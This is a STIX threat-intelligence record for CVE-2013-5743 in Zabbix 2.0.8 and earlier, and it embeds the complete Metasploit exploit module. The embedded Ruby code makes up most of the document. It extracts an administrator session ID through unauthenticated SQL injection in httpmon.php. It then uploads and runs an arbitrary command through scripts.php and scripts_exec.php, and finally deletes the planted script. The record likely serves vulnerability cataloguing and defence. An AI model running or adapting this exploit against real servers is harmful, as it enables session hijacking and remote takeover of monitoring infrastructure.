{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--797da82e-7f69-4ed4-980a-3eb509c4d728",
    "created": "2024-08-14T17:01:40.39299Z",
    "modified": "2024-08-14T17:01:40.392994Z",
    "name": "\"Zabbix 2.0.8 SQL Injection and Remote Code Execution\"",
    "description": " This module exploits an unauthenticated SQL injection vulnerability affecting Zabbix versions 2.0.8 and lower.  The SQL injection issue can be abused in order to retrieve an active session ID.  If an administrator level user is identified, remote code execution can be gained by uploading and executing remote scripts via the 'scripts_exec.php' file.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/zabbix_sqli.rb",
            "external_id": "zabbix_sqli.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-5743"
        },
        {
            "source_name": "reference",
            "url": "https://support.zabbix.com/browse/ZBX-7091"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Zabbix 2.0.8 SQL Injection and Remote Code Execution\",\n      'Description'    => %q{\n        This module exploits an unauthenticated SQL injection vulnerability affecting Zabbix\n        versions 2.0.8 and lower.  The SQL injection issue can be abused in order to retrieve an\n        active session ID.  If an administrator level user is identified, remote code execution\n        can be gained by uploading and executing remote scripts via the 'scripts_exec.php' file.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Lincoln <Lincoln[at]corelan.be>', # Discovery, Original Proof of Concept\n          'Jason Kratzer <pyoor[at]corelan.be>' # Metasploit Module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2013-5743'],\n          ['URL', 'https://support.zabbix.com/browse/ZBX-7091']\n        ],\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'Targets'        =>\n        [\n          ['Zabbix version <= 2.0.8', {}]\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'       => 255,\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl python'\n            }\n        },\n      'DisclosureDate' => '2013-09-23',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('TARGETURI', [true, 'The URI of the vulnerable Zabbix instance', '/zabbix'])\n        ])\n  end\n\n  def uri\n    return target_uri.path\n  end\n\n  def check\n    # Check version\n    vprint_status(\"Trying to detect installed version\")\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(uri, \"httpmon.php\")\n    })\n\n    if res and res.code == 200 and res.body =~ /(STATUS OF WEB MONITORING)/ and res.body =~ /(?<=Zabbix )(.*)(?= Copyright)/\n      version = $1\n      vprint_status(\"Zabbix version #{version} detected\")\n    else\n      # If this fails, guest access may not be enabled\n      vprint_status(\"Unable to access httpmon.php\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    if version and version <= \"2.0.8\"\n      return Exploit::CheckCode::Appears\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def get_session_id\n    # Generate random string and convert to hex\n    sqlq = rand_text_alpha(8)\n    sqls = sqlq.each_byte.map { |b| b.to_s(16) }.join\n    sqli = \"2 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x#{sqls},(SELECT MID((IFNULL(CAST\"\n    sqli << \"(sessionid AS CHAR),0x20)),1,50) FROM zabbix.sessions WHERE status=0 and userid=1 \"\n    sqli << \"LIMIT 0,1),0x#{sqls},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)\"\n\n    # Extract session id from database\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(\"#{uri}\", \"httpmon.php\"),\n      'vars_get' => {\n        \"applications\" => sqli\n      }\n    })\n\n    if res && res.code == 200 and res.body =~ /(?<=#{sqlq})(.*)(?=#{sqlq})/\n      session = $1\n      print_status(\"Extracted session cookie - [ #{session} ]\")\n      return session\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Unable to extract a valid session\")\n    end\n  end\n\n  def exploit\n    # Retrieve valid session id\n    @session = get_session_id\n    @sid = \"#{@session[16..-1]}\"\n    script_name = rand_text_alpha(8)\n    # Upload script\n    print_status(\"Attempting to inject payload\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'cookie' => \"zbx_sessionid=#{@session}\",\n      'uri'    => normalize_uri(uri, \"scripts.php\"),\n      'vars_post' => {\n        'sid' => @sid,\n        'form' => 'Create+script',\n        'name' => script_name,\n        'type' => '0',\n        'execute_on' => '1',\n        'command' => payload.encoded,\n        'commandipmi' => '',\n        'description' => '',\n        'usrgrpid' => '0',\n        'groupid' => '0',\n        'access' => '2',\n        'save' => 'Save'\n      }\n    })\n\n    if res and res.code == 200 and res.body =~ /(Script added)/\n      print_good(\"Payload injected successfully\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Payload injection failed!\")\n    end\n\n    # Extract 'scriptid' value\n    @scriptid = /(?<=scriptid=)(\\d+)(?=&sid=#{@sid}\">#{script_name})/.match(res.body)\n\n    # Trigger Payload\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(\"#{uri}\", \"scripts_exec.php\"),\n      'cookie' => \"zbx_sessionid=#{@session}\",\n      'vars_get' => {\n        \"execute\" =>1,\n        \"scriptid\" => @scriptid,\n        \"sid\" => @sid,\n        \"hostid\" => \"10084\"\n      }\n    })\n  end\n\n  def cleanup\n    post_data = \"sid=#{@sid}&form_refresh=1&scripts[#{@scriptid}]=#{@scriptid}&go=delete&goButton=Go (1)\"\n    print_status(\"Cleaning script remnants\")\n    res = send_request_cgi({\n     'method' => 'POST',\n      'data'   => post_data,\n      'cookie' => \"zbx_sessionid=#{@session}\",\n      'uri'    => normalize_uri(uri, \"scripts.php\")\n    })\n\n    if res and res.code == 200 and res.body =~ /(Script deleted)/\n      print_good(\"Script removed successfully\")\n    else\n      print_warning(\"Unable to remove script #{@scriptid}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-09-23",
    "x_mitre_platforms": [
        "['unix']"
    ]
}